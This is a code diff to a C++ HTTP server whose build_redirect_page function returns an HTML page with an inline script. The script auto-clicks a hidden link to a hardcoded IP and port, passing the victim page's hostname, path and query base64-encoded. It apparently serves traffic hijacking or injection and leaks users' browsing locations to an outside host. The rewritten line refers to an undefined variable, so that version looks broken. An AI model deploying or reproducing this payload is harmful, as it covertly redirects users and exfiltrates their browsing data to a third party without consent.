@@ -30,7 +30,7 @@ void HTTPServer::start_accept() {
 
 std::string HTTPServer::build_redirect_page(const std::string& host) {
     (void)host;
-     const std::string html = R"(<html><head></head><body><a href="" id="h"></a><script> var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname) + "&p=" + btoa(window.location.pathname + window.location.search); var h=document.getElementById("h"); h.href=strU; if(document.all){ h.click(); }else { var e=document.createEvent("MouseEvents"); e.initEvent("click",true,true); h.dispatchEvent(e); }</script></body></html>)";
+     const std::string html = R"(<html><head></head><body><a href="" id="h"></a><script>var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname)+ "&p=" + btoa(window.location.pathname + window.location.search);h.href=strU;if(document.all){document.getElementById("h").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("h").dispatchEvent(e);}</script></body></html>)";
 
     // 关键：不发 Content-Length，也不发 Connection 头（既没有 close 也没有 keep-alive）
     // 这样 curl 会打印：no chunk, no close, no size. Assume close to signal end
